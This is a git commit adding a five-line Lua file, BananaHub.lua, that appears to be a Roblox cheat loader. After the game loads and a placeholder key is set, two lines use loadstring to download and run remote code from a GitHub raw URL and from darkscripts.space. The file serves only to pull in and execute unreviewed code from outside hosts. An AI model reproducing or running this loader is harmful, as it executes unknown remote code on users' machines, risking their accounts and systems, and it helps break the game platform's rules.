09877a701003d08ffded30193d000a0918c43333
obiiyeuiem <carlalu001@gmail.com>
2025-01-03 02:26:25 +0800

    BananaHub.lua

---
+++ BananaHub.lua
@@ -0,0 +1,5 @@
+repeat wait() until game:IsLoaded() and game.Players.LocalPlayer 
+getgenv().Key = "Input_Key" 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaHub.lua"))()
+wait("0.2")
+loadstring(game:HttpGet('https://darkscripts.space/scripts/131ff979-977f-424e-b9ef-88103b38bc60_886814449720229888.lua',true))()
